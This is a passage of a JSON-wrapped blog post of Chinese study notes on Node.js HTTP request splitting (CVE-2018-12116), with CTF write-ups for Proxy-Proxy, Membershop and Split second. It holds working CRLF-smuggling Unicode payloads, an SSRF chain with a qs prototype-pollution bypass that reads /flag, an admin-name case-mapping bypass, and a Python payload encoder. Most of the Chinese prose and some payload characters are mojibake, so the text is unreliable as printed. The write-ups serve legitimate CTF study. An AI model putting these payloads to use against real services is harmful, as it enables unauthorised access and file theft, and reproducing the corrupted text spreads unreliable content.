Wp"},{"categories":["NOTES\u0026SUMMARY"],"contents":"è¯´åˆ°ä¸HTTPè¯·æ±‚æœ‰å…³çš„æ”»å‡»æ–¹å¼èƒ½æƒ³åˆ°ä»€ä¹ˆï¼Ÿ\næ˜¯ä¸æ˜¯ä¸€ä¸‹å­æç„¶å¤§æ˜ç™½äº†\nè¿™ä¸€ç¯‡å°±æ˜¯å…¶ä¸­HTTP Request Splittingçš„å­¦ä¹ ç¬”è®°ï¼Œé•¿æœŸæ›´æ–°ï¼›å…¶å®ƒæ¨¡å—çš„ä¹Ÿä¼šéšåæ›´æ–°~\nè€è§„çŸ©ï¼Œæ‰€æœ‰çš„å‚è€ƒé“¾æ¥\u0026amp;dockeré“¾æ¥æ”¾åˆ°æ–‡æœ«\nNode.js: httpè¯·æ±‚è·¯å¾„ä¸­çš„unicodeå­—ç¬¦æŸå ä½¿ç”¨Node.jså‘ç‰¹å®šè·¯å¾„å‘å‡ºhttpè¯·æ±‚ï¼Œä½†æ˜¯å´è¢«å®šå‘åˆ°äº†ä¸ä¸€æ ·çš„è·¯å¾„\nè™½ç„¶ç”¨æˆ·å‘å‡ºçš„httpè¯·æ±‚é€šå¸¸æ˜¯ä¸ªå­—ç¬¦ä¸²stringï¼Œä½†Node.jsæœ€ç»ˆå¿…é¡»å°†è¯·æ±‚ä»¥åŸå§‹å­—èŠ‚raw bytesè¾“å‡ºï¼Œjsæ”¯æŒunicodeï¼Œè¿™å…¶ä¸­æ¶‰åŠåˆ°äº†unicodeç¼–ç è½¬æ¢ã€‚å¯¹äºä¸åŒ…å«bodyçš„è¯·æ±‚ï¼ŒNode.jsé»˜è®¤ä½¿ç”¨latin1ï¼Œå®ƒæ˜¯å•å­—èŠ‚ç¼–ç ï¼Œä¸èƒ½è¡¨ç¤ºé«˜ç¼–å·çš„unicodeå­—ç¬¦ï¼Œæ¯”å¦‚emoji ğŸ¶\nv = \u0026#39;/caf\\u{E9}\\u{01F436}\u0026#39; console.log(v) w = Buffer.from(v, \u0026#39;latin1\u0026#39;).toString(\u0026#39;latin1\u0026#39;) console.log(w) ä¸¤å­—èŠ‚çš„unicodeç¼–ç ç”¨latin1è½¬æ¢ä¸ºå•å­—èŠ‚æ—¶ä¼šè¢«æˆªå»å¼€å¤´çš„ç¬¬ä¸€ä¸ªå­—èŠ‚\nconsole.log(Buffer.from(\u0026#39;\\u{5b}\u0026#39;, \u0026#39;latin1\u0026#39;).toString()) console.log(Buffer.from(\u0026#39;\\u{015b}\u0026#39;, \u0026#39;latin1\u0026#39;).toString()) console.log(Buffer.from(\u0026#39;\\u{0128}\u0026#39;, \u0026#39;latin1\u0026#39;).toString()) console.log(Buffer.from(\u0026#39;\\u{28}\u0026#39;, \u0026#39;latin1\u0026#39;).toString()) é‚£è¿™ä¸ªNode.jsçš„å®‰å…¨é—®é¢˜è·ŸSSRFåˆæ˜¯æ€ä¹ˆè”ç³»åˆ°ä¸€èµ·çš„å‘¢ï¼Ÿå¤„ç†ç”¨æˆ·è¾“å…¥æ—¶å‡ºç°äº†æ•°æ®æŸåæ˜¯ä¸ªæ˜æ˜¾çš„å±é™©ä¿¡å·\nHTTP Request Splitting This entails the adversary injecting malicious user input into various standard and/or user defined HTTP headers within a HTTP Request through user input of Carriage Return (CR), Line Feed (LF), Horizontal Tab (HT), Space (SP) characters as well as other valid/RFC compliant special characters and unique character encoding. This malicious user input allows for web script to be injected in HTTP headers as well as into browser cookies or Ajax web/browser object parameters like XMLHttpRequest during implementation of asynchronous requests.\né€šä¿—æ¥è¯´ï¼Œå°±æ˜¯åŸæœ¬1ä¸ªè¯·æ±‚å¯¹åº”1æ¬¡å“åº”ï¼Œç°åœ¨æˆ‘ä»¬å¯¹è¯·æ±‚çš„bodyéƒ¨åˆ†å†æ·»åŠ 1ä¸ªè¯·æ±‚ï¼Œå¯¼è‡´çœ‹ä¼¼å‘é€äº†1æ¬¡è¯·æ±‚å®åˆ™ä¼šè¢«è§£é‡Šä¸º2ä¸ªå“åº”è¢«åŠ è½½å‡ºæ¥ï¼Œä¼šé€ æˆXSSå’ŒSSRF\nä¸¾ä¸€ä¸ªç®€å•çš„å°æ —å­ï¼šä¸€èˆ¬çš„è¯·æ±‚å½¢å¼æ˜¯è¿™æ ·çš„\nGET /private-api?q=\u0026lt;user-input-here\u0026gt; HTTP/1.1 ä½†æ˜¯æˆ‘ä»¬æ„é€ äº†è¿™æ ·çš„ç”¨æˆ·è¾“å…¥\nx HTTP/1.1\\r\\n\\r\\nDELETE /private-api HTTP/1.1\\r\\n å½“è¯·æ±‚å‘å‡ºåï¼ŒæœåŠ¡ç«¯å°†ä¼šæ”¶åˆ°è¿™æ ·çš„è¯·æ±‚\nGET /private-api?q=x HTTP/1.1 DELETE /private-api HTTP/1.1 åŒ…å«äº†ä¸¤ä¸ªè¯·æ±‚æ–¹å¼ï¼Œå¦‚æœæœåŠ¡ç«¯æ²¡æœ‰è®¾ç½®ç‰¹æ®Šçš„è¿‡æ»¤åˆ™å¯èƒ½ä¼šå°†ä¸¤ä¸ªè¯·æ±‚å…¨éƒ¨æ‰§è¡Œå¹¶å›æ˜¾ï¼›è€Œå¦‚æœç¬¬äºŒä¸ªé¢å¤–çš„è¯·æ±‚åŒ…å«ä¸€äº›åªæœ‰æœåŠ¡ç«¯æœ¬åœ°æ‰èƒ½è®¿é—®åˆ°çš„å†…å®¹ï¼Œåˆ™ä¼šé€ æˆSSRF(Server-Side Request Forgery)\nSSRF via Request Splitting / cve-2018-12116 æ­£å¦‚ä¸Šé¢æ —å­å±•ç¤ºçš„é‚£æ ·ï¼Œä¸è¿‡ä¸€èˆ¬httpåº“éƒ½ä¼šå¯¹è¿™ç§è¡Œä¸ºåšå‡ºé˜²èŒƒï¼›Node.jsä¹Ÿä¸ä¾‹å¤–ï¼Œæ¯”å¦‚\nconst http = require(\u0026#39;http\u0026#39;); http.get(\u0026#39;http://gqa6995cu69dkt0oxvzzzwzt0k6auz.burpcollaborator.net/\\r\\n/test\u0026#39;) æ¢æˆunicodeå‘¢ï¼Ÿç”»é£å¼€å§‹å¥‡æ€ªäº†\n\u0026#39;http://example.com/\\u{010D}\\u{010A}/test\u0026#39; ä¸Šé¢æˆ‘ä»¬æè¿‡çš„unicodeæˆªå»å¼€å¤´ç¬¬ä¸€ä¸ªå­—èŠ‚çš„äº‹æƒ…ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„é€ \\r\\näº†\nBuffer.from(\u0026#39;http://example.com/\\u{010D}\\u{010A}/test\u0026#39;, \u0026#39;latin1\u0026#39;).toString() å½“Node.js\u0026lt;=8æ„é€ å¯¹è¿™æ ·çš„urlè¯·æ±‚æ—¶ï¼Œç”±äºä»–ä»¬ä¸æ˜¯HTTPæ§åˆ¶å­—ç¬¦æ‰€ä»¥ä¸ä¼šä¿®æ”¹ï¼ŒåŸæ ·è¾“å‡ºï¼›è€Œç»“åˆä¸Šé¢æˆ‘ä»¬æè¿‡çš„unicodeæˆªå»å¼€å¤´ç¬¬ä¸€ä¸ªå­—èŠ‚çš„äº‹æƒ…ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„é€ \\r\\nçš„CRLFiäº†\nç°åœ¨çš„Node.jså‡å·²ä¿®å¤æ­¤é—®é¢˜ï¼Œå®˜æ–¹ä¿®å¤-\u0026gt;http: add \u0026ndash;security-revert for CVE-2018-12116\næ—§ç‰ˆä¸­ä¼šç›´æ¥å¯¹è§£é‡Šä¸äº†çš„unicodeæŠ¥é”™ï¼Œè€Œä¸æ˜¯å°è¯•åŸå°ä¸åŠ¨çš„æ¬è¿‡å»è¯·æ±‚\nçœŸå®åœºæ™¯ä¸‹çš„æ¡ˆä¾‹ æ¥è‡ª-\u0026gt;Security Bugs in Practice: SSRF via Request Splitting å¼ºçƒˆå»ºè®®çœ‹åŸæ–‡\nç«ç‹é‚®ç®±è´¦å·çš„å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨åç«¯äº¤äº’æµç¨‹æ˜¯è¿™æ ·çš„\n+--------+ +--------+ +-----------+ +----------+ | Client | HTTP | API | HTTP | DataStore | SQL | MySQL | | |\u0026lt;------\u0026gt;| Server |\u0026lt;------\u0026gt;| Service |\u0026lt;-----\u0026gt;| Database | +--------+ +--------+ +-----------+ +----------+ å®¢æˆ·ç«¯å‘å‡ºçš„è¯·æ±‚æ˜¯é€šè¿‡httpä¸API Serveräº¤äº’çš„ï¼Œæ¯”å¦‚ä¸€ä¸ªè¿™æ ·çš„è¯·æ±‚\nGET /email/74657374406578616d706c652e636f6d ä¼šå¾—åˆ°test@example.comçš„é‚®ä»¶è®°å½•ï¼Œç”¨hexåšäº†è¯·æ±‚çš„è·¯ç”±ï¼Œä½†æ˜¯ä¸€ä¸ªåˆ é™¤æ“ä½œå´æ˜¯ç›´æ¥æ‹¼æ¥å­—ç¬¦ä¸²\nDELETE /account/xyz/emails/test@example.com æ­¤æ—¶ï¼Œæœ€åçš„ç«¯ç‚¹å¯æ§ï¼Œç»“åˆä¸Šé¢çš„bugï¼Œå½“æˆ‘ä»¬æ³¨å†Œè¿™æ ·ä¸€ä¸ªè´¦å·\nx@Ì ÅˆÆ†Æ†ÉÄ¯1Ì®1ÄÌŠÄÌŠÉ†Í…Æ†Ì Ä¯accountÄ¯f9f9eebb05ef4b819b0467cc5ddd3b4aÄ¯sessionsÌ ÅˆÆ†Æ†ÉÄ¯1Ì®1ÄÌŠÄÌŠ.cc å®ƒå…¶å®æ˜¯è¿™æ ·\nv = \u0026#39;x@Ì ÅˆÆ†Æ†ÉÄ¯1Ì®1ÄÌŠÄÌŠÉ†Í…Æ†Ì Ä¯accountÄ¯f9f9eebb05ef4b819b0467cc5ddd3b4aÄ¯sessionsÌ ÅˆÆ†Æ†ÉÄ¯1Ì®1ÄÌŠÄÌŠ.cc\u0026#39; Buffer.from(v.toLowerCase(), \u0026#34;latin1\u0026#34;).toString() çœŸæ˜¯Node.jsçš„ç¾å¦™ç‰¹æ€§\nå¯¹è¿™æ ·ä¸€ä¸ªè´¦å·å†æ¬¡è¿›è¡ŒDELETEè¯·æ±‚æ—¶åˆ™ä¼šè¿™æ ·\nconsole.log(Buffer.from(\u0026#39;DELETE /account/f9f9eebb05ef4b819b0467cc5ddd3b4a/email/x@Ì ÅˆÉ”É”ÉÄ¯1Ì®1ÄÌŠÄÌŠÉ‡Í…É”Ì Ä¯accountÄ¯f9f9eebb05ef4b819b0467cc5ddd3b4aÄ¯sessionsÌ ÅˆÉ”É”ÉÄ¯1Ì®1ÄÌŠÄÌŠ.cc\u0026#39;, \u0026#39;latin1\u0026#39;).toString()) SSRFæ¥äº†\n[ASISCTF final 2018]Proxy-Proxy ç®€å•å®¡äº†ä¸€ä¸‹ä»£ç ï¼Œæ ‡è®°åˆ°æ³¨é‡Šä¸­äº†\nconst express = require(\u0026#39;express\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;); const path = require(\u0026#39;path\u0026#39;); const body_parser = require(\u0026#39;body-parser\u0026#39;); const md5 = require(\u0026#39;md5\u0026#39;); const http = require(\u0026#39;http\u0026#39;); var ip = require(\u0026#34;ip\u0026#34;); require(\u0026#39;x-date\u0026#39;); var server_ip = ip.address() const server = express(); server.use(body_parser.urlencoded({ extended: true })); server.use(express.static(\u0026#39;public\u0026#39;)) server.set(\u0026#39;views\u0026#39;, path.join(__dirname, \u0026#39;views\u0026#39;)); server.set(\u0026#39;view engine\u0026#39;, \u0026#39;jade\u0026#39;); server.listen(5000) server.get(\u0026#39;/\u0026#39;, function(request, result) { result.render(\u0026#39;index\u0026#39;); result.end() }) function check_endpoint(available_endpoints, endpoint) { for (i of available_endpoints) { if (endpoint.indexOf(i) == 0) { return true; } } return false; } fs.readFile(\u0026#39;flag.dat\u0026#39;, \u0026#39;utf8\u0026#39;, function(err, contents) { if (err) { throw err; } flag = contents; }) server.get(\u0026#39;/proxy/internal_website/:page\u0026#39;, function(request, result) { var available_endpoints = [\u0026#39;public_notes\u0026#39;, \u0026#39;public_links\u0026#39;, \u0026#39;source_code\u0026#39;] var page = request.params.page result.setHeader(\u0026#39;X-Node-js-Version\u0026#39;, \u0026#39;v8.12.0\u0026#39;)\t// ç‰ˆæœ¬æç¤º result.setHeader(\u0026#39;X-Express-Version\u0026#39;, \u0026#39;v4.16.3\u0026#39;) if (page.toLowerCase().includes(\u0026#39;flag\u0026#39;)) { // å…ˆè½¬å°å†™å†åˆ¤æ–­ ä¸èƒ½æœ‰flag result.sendStatus(403) result.end() } else if (!check_endpoint(available_endpoints, page)) { // ç™½åå•å®¡æŸ¥ result.render(\u0026#39;available_endpoints\u0026#39;, { endpoints: JSON.stringify(available_endpoints) }) result.end() } else { http.get(\u0026#39;http://127.0.0.1:5000/\u0026#39; + page, function(res) { res.setEncoding(\u0026#39;utf8\u0026#39;); if (res.statusCode == 200) { res.on(\u0026#39;data\u0026#39;, function(chunk) { result.render(\u0026#39;proxy\u0026#39;, { contents: chunk // è¿”å›ç»“æœ }) result.end() }); } else if (res.statusCode == 404) { result.render(\u0026#39;proxy\u0026#39;, { contents: \u0026#39;The resource not found.\u0026#39; }) result.end() } else { result.end() } }).on(\u0026#39;error\u0026#39;, function(e) { console.log(\u0026#34;Got error: \u0026#34; + e.message); // è¿”å›æŠ¥é”™åŸå›  }); } }) server.use(function(request, result, next) { // æ£€æŸ¥ipæ˜¯å¦ä¸ºæœ¬åœ° ip = request.connection.remoteAddress if (ip.substr(0, 7) == \u0026#34;::ffff:\u0026#34;) { ip = ip.substr(7) } if (ip != \u0026#39;127.0.0.1\u0026#39; \u0026amp;\u0026amp; ip != server_ip) { result.render(\u0026#39;unauthorized\u0026#39;) result.end() } else { next() } }) server.get(\u0026#39;/public_notes\u0026#39;, function(request, result) { result.render(\u0026#39;public_notes\u0026#39;); result.end() }) server.get(\u0026#39;/public_links\u0026#39;, function(request, result) { result.render(\u0026#39;public_links\u0026#39;); result.end() }) server.get(\u0026#39;/source_code\u0026#39;, function(request, result) { fs.readFile(\u0026#39;server.js\u0026#39;, \u0026#39;utf8\u0026#39;, function(err, contents) { if (err) { throw err; } result.render(\u0026#39;source_code\u0026#39;, { source: contents // è¿”å›æºç  }) result.end() }) }) server.get(\u0026#39;/flag/:token\u0026#39;, function(request, result) { var token = request.params.token if (token.length \u0026gt; 10) { console.log(ip) // é•¿åº¦å¤§äº10å›æ˜¾ip fs.writeFile(\u0026#39;public/temp/\u0026#39; + md5(ip + token), flag, (err) =\u0026gt; { // å°†flagå†™å…¥public/temp/md5(ip+token)è·¯å¾„ä¸‹ è·¯å¾„å¯æ§ ä½†æ˜¯è®¿é—®æœ¬èº«å—é™ éœ€è¦SSRFç»•è¿‡ if (err) throw err; result.end(); }); } }) server.get(\u0026#39;/\u0026#39;, function(request, result) { result.render(\u0026#39;index\u0026#39;); result.end() }) server.get(\u0026#39;*\u0026#39;, function(req, result) { result.sendStatus(404); result.end() }); çªç ´å£åœ¨å®ƒä½¿ç”¨çš„Node.jsçš„ç‰ˆæœ¬æ°å¥½æœ‰ä¸Šè¿°SSRFçš„é—®é¢˜\nresult.setHeader(\u0026#39;X-Node-js-Version\u0026#39;, \u0026#39;v8.12.0\u0026#39;) result.setHeader(\u0026#39;X-Express-Version\u0026#39;, \u0026#39;v4.16.3\u0026#39;) å…¥æ‰‹ç‚¹çš„ä»£ç ä»£ç å°±æ˜¯è¿™é‡Œäº†\nç°åœ¨å°±è¯´æƒ³åŠæ³•ç»•è¿‡ç™½åå•çš„å®¡æŸ¥å¹¶æ„é€ payloadï¼›æˆ‘ä»¬éœ€è¦ç¬¬ä¸€ä¸ªè¯·æ±‚æŒ‡å‘/proxy/internal_website/public_notesï¼Œç¬¬äºŒä¸ªè¯·æ±‚æŒ‡å‘/flag/amizï¼Œè®©flagå­˜åœ¨public/temp/md5(127.0.0.1amiz)è·¯å¾„ä¸‹\npublic_notes\\u{0120}HTTP/1.1\\u{010D}\\u{010A}Host:\\u{0120}127.0.0.1\\u{010D}\\u{010A}\\u{010D}\\u{010A}GET\\u{0120}/\\u{0166}\\u{016c}\\u{0161}\\u{0167}/amiz /proxy/internal_website/public_notes%C4%A0HTTP%2F1.1%C4%8D%C4%8AHost%3A%C4%A0127.0.0.1%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0%2F%C5%A6%C5%AC%C5%A1%C5%A7%2Famiz [å®‰æ´µæ¯ 2019]Membershop adminä¼šè¢«è¿‡æ»¤ï¼Œé‚£å°±å…ˆç®€å•ç™»å…¥\næŠ“åŒ…åé€šè¿‡sessionå¯ä»¥çœ‹å‡ºæ˜¯koaæ¡†æ¶\nè¿™é‡Œå‡ºé¢˜äººè¯´å¾ˆå®¹æ˜“è”æƒ³åˆ°åç«¯ä½¿ç”¨toUpperCase()çš„è½¬æ¢ï¼Œç”¨æ‹‰ä¸æ–‡è¶Šæƒç™»å½•admÄ±nï¼Œä¹‹å‰ä¹Ÿæœ‰ä¸€æ¬¡åšé¢˜ç”¨åˆ°è¿™ä¸ªç‚¹äº†ï¼Œä½†æ˜¯åœ¨è¿™é‡Œæ²¡æœ‰æƒ³èµ·æ¥ï¼Œæˆ‘çš„\nè¿™ä¸‹å¯ä»¥çœ‹æºç äº†\nconst Koa = require(\u0026#39;koa\u0026#39;) const router = require(\u0026#39;koa-router\u0026#39;) const session = require(\u0026#39;koa-session\u0026#39;) const bodyParser = require(\u0026#39;koa-bodyparser\u0026#39;) const isString = require(\u0026#39;underscore\u0026#39;).isString const views = require(\u0026#39;koa-views\u0026#39;) const path = require(\u0026#39;path\u0026#39;) const static = require(\u0026#39;koa-static\u0026#39;) const http = require(\u0026#39;http\u0026#39;) const fs = require(\u0026#39;fs\u0026#39;) const md5 = require(\u0026#39;md5\u0026#39;); const qs = require(\u0026#39;qs\u0026#39;); const app = new Koa() const home = new router() const CONFIG = { key: \u0026#39;koa:sess\u0026#39;, maxAge: 1800000, overwrite: true, httpOnly: true, signed: true, rolling: false, renew: false, }; function checkUser(username){ while(username.match(/admin/i)) { username = username.replace(/admin/i, \u0026#39;\u0026#39;); } if(isString(username) \u0026amp;\u0026amp; username){ return username; }else{ return undefined; } } function checkUrl(url){ if(url.indexOf(\u0026#34;http://\u0026#34;+server_ip+\u0026#34;:3000/query\u0026#34;) === 0 \u0026amp;\u0026amp; url.indexOf(\u0026#39;save\u0026#39;) === -1){ return url; }else{ return \u0026#39;errorurl\u0026#39;; } } function WriteResults(sandbox,data){ let filePath = sandbox +\u0026#39;/results.txt\u0026#39; return new Promise(resolve =\u0026gt;{ fs.appendFile(filePath,data,\u0026#39;utf8\u0026#39;,function(error){ if(error){ console.log(error); return false; } console.log(\u0026#39;å†™å…¥æˆåŠŸ\u0026#39;); resolve(filePath); }); }); } function DeleteResults(sandbox){ let filePath = sandbox+\u0026#39;/results.txt\u0026#39; fs.unlink(filePath),function(error){ if(error){ console.log(err); return false; } console.log(\u0026#39;åˆ é™¤æ–‡ä»¶æˆåŠŸ\u0026#39;); } } home.get(\u0026#39;/query\u0026#39;,async(ctx)=\u0026gt;{ if(ctx.query.param){ ctx.response.body = String(ctx.query.param).replace(/\u0026amp;/g, \u0026#39;\u0026amp;amp;\u0026#39;).replace(/\u0026lt;/g, \u0026#39;\u0026amp;lt;\u0026#39;).replace(/\u0026gt;/g, \u0026#39;\u0026amp;gt;\u0026#39;) }else{ ctx.status = 403; ctx.response.body = \u0026#39;missing parameter:param\u0026#39;; } }) home.get(\u0026#39;/request\u0026#39;,async(ctx)=\u0026gt;{ if(ctx.session.username === \u0026#39;ADMIN\u0026#39; \u0026amp;\u0026amp; ctx.query.url){ url = decodeURI(checkUrl(ctx.query.url)) if(url === \u0026#39;errorurl\u0026#39;){ ctx.response.body = \u0026#39;error url\u0026#39;; }else{ console.log(\u0026#34;è¯·æ±‚çš„url:\u0026#34;+typeof(url)+\u0026#34;:\u0026#34;+url); return new Promise( resolve =\u0026gt; { const req = http.request(url, res =\u0026gt; { res.setEncoding(\u0026#39;utf-8\u0026#39;); let data = \u0026#39;\u0026#39;; let error; if (res.statusCode !== 200){ error = new Error(\u0026#39;è¯·æ±‚å¤±è´¥\\n\u0026#39; + `çŠ¶æ€ç : ${res.statusCode}`) }; if (error) { console.error(error.message); res.resume(); return; } res.on(\u0026#39;data\u0026#39;, chunk =\u0026gt; { data += chunk.toString(); }); res.on(\u0026#39;end\u0026#39;, async() =\u0026gt; { let out = await WriteResults(ctx.session.sandbox,data); ctx.body = \u0026#39;Requst results in :\u0026#39;+out.replace(\u0026#39;tmp\u0026#39;,\u0026#39;\u0026#39;); resolve(); }) }) req.on(\u0026#39;error\u0026#39;, function(err){ console.log(err); }); req.end(); }); } }else{ ctx.status = 403; ctx.response.body = \u0026#39;403: You have not the permission\u0026#39; } }) home.get(\u0026#39;/save\u0026#39;,async(ctx)=\u0026gt;{ let ip = ctx.request.ip; if (ip.substr(0, 7) == \u0026#34;::ffff:\u0026#34;) { ip = ip.substr(7); } if (ip !== \u0026#39;127.0.0.1\u0026#39; \u0026amp;\u0026amp; ip !== server_ip) { ctx.status = 403; ctx.response.body = \u0026#39;403: You are not the local user\u0026#39;; }else { let reqbody = {switch:false} reqbody = qs.parse(ctx.querystring,{allowPrototypes: false}); if(reqbody.switch === true \u0026amp;\u0026amp; reqbody.sandbox \u0026amp;\u0026amp; reqbody.opath \u0026amp;\u0026amp;fs.existsSync(reqbody.spath)){ if(fs.existsSync(reqbody.sandbox)){ paths.opath = fs.readdirSync(reqbody.sandbox)[0]; }else if(fs.existsSync(reqbody.opath)){ let buffer; tmp[reqbody.sandbox][\u0026#39;opath\u0026#39;] = reqbody.opath; if(/[flag]/.test(tmp[reqbody.sandbox][\u0026#39;opath\u0026#39;])){ buffer = tmp[reqbody.sandbox][\u0026#39;opath\u0026#39;].replace(/f|l|a|g/g,\u0026#39;\u0026#39;); }else{ buffer = reqbody.opath; } } let opath = paths.opath? paths.opath : buffer; let text = fs.readFileSync(opath, \u0026#39;utf8\u0026#39;); await WriteResults(reqbody.spath,text); }else{ return false; } } }) home.get(\u0026#39;/delete\u0026#39;,async(ctx)=\u0026gt;{ if(ctx.session.username === \u0026#39;ADMIN\u0026#39; \u0026amp;\u0026amp; fs.existsSync(ctx.session.sandbox+\u0026#39;/results.txt\u0026#39;)){ DeleteResults(ctx.session.sandbox); ctx.response.body = \u0026#39;Delete the results Successfully!\u0026#39; }else{ ctx.response.body = \u0026#39;Nothing to delete!\u0026#39;; } }) home.get(\u0026#39;/login\u0026#39;,async(ctx)=\u0026gt;{ if(ctx.query.userName){ let username = checkUser(ctx.query.userName); if (username !== undefined){ ctx.session.username = username.toUpperCase(); } } ctx.redirect(\u0026#39;/\u0026#39;); }) home.get(\u0026#39;/\u0026#39;,async(ctx)=\u0026gt;{ let isAdmin = undefined; if(!ctx.session.username){ await ctx.render(\u0026#39;user\u0026#39;,{ list:undefined, isAdmin:isAdmin }); }else{ info.username = ctx.session.username; info.Privilege = \u0026#34;Staff\u0026#34;; if(ctx.session.username === \u0026#39;ADMIN\u0026#39;){ info.Privilege = \u0026#34;Monitor\u0026#34;; isAdmin = true; if(!ctx.session.sandbox){ ctx.session.sandbox = \u0026#39;tmp/\u0026#39;+md5(ctx.request.ip); } if (!fs.existsSync(ctx.session.sandbox)){ fs.mkdirSync(ctx.session.sandbox); } } await ctx.render(\u0026#39;user\u0026#39;,{ list:info, isAdmin:isAdmin }); } }) app.keys = [\u0026#39;hpdoger\u0026#39;]; var info = new Object(); var tmp = []; var paths = []; //depend on remote server,not real var server_ip = \u0026#39;127.0.0.1\u0026#39; app.use(views(path.join(__dirname, \u0026#39;./views\u0026#39;), { extension: \u0026#39;ejs\u0026#39; })) app.use(static( path.join( __dirname, \u0026#39;./static\u0026#39;) )) app.use(static( path.join( __dirname, \u0026#39;./tmp\u0026#39;) )) app.use(bodyParser()) app.use(session(CONFIG, app)); app.use(home.routes()).use(home.allowedMethods()); app.listen(3000) console.log(\u0026#39;[demo] start-quick is starting at port 3000\u0026#39;) å””ï¼Œçœ‹èµ·æ¥è¦æ¯”å…¶å®ƒçš„å¤æ‚ä¸å°‘ï¼Œä½†æ˜¯æ ¸å¿ƒæ¼æ´ç‚¹æ˜¯ä¸€æ ·çš„ï¼›ç®€å•å®¡ä¸€ä¸‹ä»£ç \nåªå…è®¸adminç”¨æˆ·æ‰å¯ä»¥åŠ è½½å…¶å®ƒçš„æ¨¡æ¿\nç¡®å®æ˜¯toUpperCase()çš„é—®é¢˜ï¼Œå¾ˆè½»æ¾å°±ç”¨admÄ±nç»•è¿‡äº†\n/requestè·¯ç”±ä¸‹çš„è¯·æ±‚ç»è¿‡CheckUrlçš„æ£€æŸ¥\nå¿…é¡»å¼€å¤´æ˜¯http://127.0.0.1:3000/queryï¼Œæ²¡æ³•ç»•è¿‡ï¼Œéœ€è¦SSRFï¼›è¯·æ±‚ä¹‹åä¼šè¢«è®°å½•åœ¨sandboxçš„results.txté‡Œé¢ï¼ˆè¿½åŠ çš„å½¢å¼ï¼‰ï¼Œsandboxæ ¹æ®ipå»ºç«‹\nè€Œæ°å¥½/queryæœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªè·¯ç”±\nå¹¶ä¸”å‚æ•°paramæ¯”è¾ƒå¥½ç»•è¿‡ï¼Œæˆ‘ä»¬å€ŸåŠ©å®ƒæ¥å®Œæˆæˆ‘ä»¬çš„æ”»å‡»ï¼›æ¥ä¸‹æ¥æ‰¾åˆ©ç”¨ç‚¹ï¼Œçœ‹åˆ°/saveè·¯ç”±\nç®€å•çš„åˆ†æå†™åœ¨æ³¨é‡Šä¸­äº†ï¼Œ138è¡Œç”¨ssrfç»•è¿‡ï¼Œ146è¡Œä½¿ç”¨çš„qsåº“æœ‰åŸå‹é“¾æ±¡æŸ“çš„é—®é¢˜ï¼Œä¼ å‚]=switchå³å¯ç»•è¿‡ï¼›154è¡Œçš„åˆ¤æ–­ä¹Ÿéœ€è¦ç»•è¿‡ï¼ŒåŸå‹é“¾æ±¡æŸ“sandboxä¸‹çš„ä¸€ä¸ªæ–‡ä»¶ä¸º/flagï¼Œå†å»è‡ªå®šä¹‰è¯»åˆ°spathä¸­\ntmp[\u0026#39;__proto__\u0026#39;][\u0026#39;opath\u0026#39;] = \u0026#39;/flag\u0026#39;; =\u0026gt; paths.opath = /flag payload\namiz HTTP/1.1 Host: 127.0.0.1:3000 Connection: keep-alive GET /save?]=switch\u0026amp;sandbox=__proto__\u0026amp;opath=/flag\u0026amp;spath=/app/tmp/c74e4def8b621891bc34c84bca9b2a76 http://127.0.0.1:3000/query?param=1\\u{0120}HTTP/1.1\\u{010D}\\u{010A}Host:\\u{0120}127.0.0.1:3000\\u{010D}\\u{010A}Connection:\\u{0120}keep-alive\\u{010D}\\u{010A}\\u{010D}\\u{010A}GET\\u{0120}/\\u{0173}\\u{0161}\\u{0176}\\u{0165}?]=switch\u0026amp;sandbox=__proto__\u0026amp;opath=/flag\u0026amp;spath=tmp/c74e4def8b621891bc34c84bca9b2a76 å½“ç„¶ï¼Œç”¨å®Œå…¨unicodeç¼–ç ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œäº²æµ‹è¿™ä¸ªå…¨ç¼–ç å®¹é”™ç‡ä¼šé«˜ä¸€ä¸¢ä¸¢\nfrom requests.utils import quote _payload = \u0026#39;\u0026#39;\u0026#39;amiz HTTP/1.1 Host: 127.0.0.1:3000 Connection: keep-alive GET /save?]=switch\u0026amp;sandbox=__proto__\u0026amp;opath=/flag\u0026amp;spath=/app/tmp/c74e4def8b621891bc34c84bca9b2a76\u0026#39;\u0026#39;\u0026#39; payload = _payload.replace(\u0026#34;\\n\u0026#34;, \u0026#34;\\r\\n\u0026#34;) payload = \u0026#39;\u0026#39;.join(chr(int(\u0026#39;0xff\u0026#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload) print(quote(payload)) [nullcon HackIM2020]Split second //node 8.12.0 var express = require(\u0026#39;express\u0026#39;); var app = express(); var fs = require(\u0026#39;fs\u0026#39;); var path = require(\u0026#39;path\u0026#39;); var http = require(\u0026#39;http\u0026#39;); var pug = require(\u0026#39;pug\u0026#39;); app.get(\u0026#39;/\u0026#39;, function(req, res) { res.sendFile(path.join(__dirname + \u0026#39;/index.html\u0026#39;)); }); app.get(\u0026#39;/source\u0026#39;, function(req, res) { res.sendFile(path.join(__dirname + \u0026#39;/source.html\u0026#39;)); }); app.get(\u0026#39;/getMeme\u0026#39;,function(req,res){ res.send(\u0026#39;\u0026lt;iframe src=\u0026#34;https://giphy.com/embed/LLHkw7UnvY3Kw\u0026#34; width=\u0026#34;480\u0026#34; height=\u0026#34;480\u0026#34; frameBorder=\u0026#34;0\u0026#34; class=\u0026#34;giphy-embed\u0026#34; allowFullScreen\u0026gt;\u0026lt;/iframe\u0026gt;\u0026lt;p\u0026gt;\u0026lt;a href=\u0026#34;https://giphy.com/gifs/kid-dances-jumbotron-LLHkw7UnvY3Kw\u0026#34;\u0026gt;via GIPHY\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt;\u0026#39;) }); app.get(\u0026#39;/flag\u0026#39;, function(req, res) { var ip = req.connection.remoteAddress; if (ip.includes(\u0026#39;127.0.0.1\u0026#39;)) { var authheader = req.headers[\u0026#39;adminauth\u0026#39;]; var pug2 = decodeURI(req.headers[\u0026#39;pug\u0026#39;]); var x=pug2.match(/[a-z]/g); if(!x){ if (authheader === \u0026#34;secretpassword\u0026#34;) { var html = pug.render(pug2); } } else{ res.send(\u0026#34;No characters\u0026#34;); } } else{ res.send(\u0026#34;You need to come from localhost\u0026#34;); } }); app.get(\u0026#39;/core\u0026#39;, function(req, res) { var q = req.query.q; var resp = \u0026#34;\u0026#34;; if 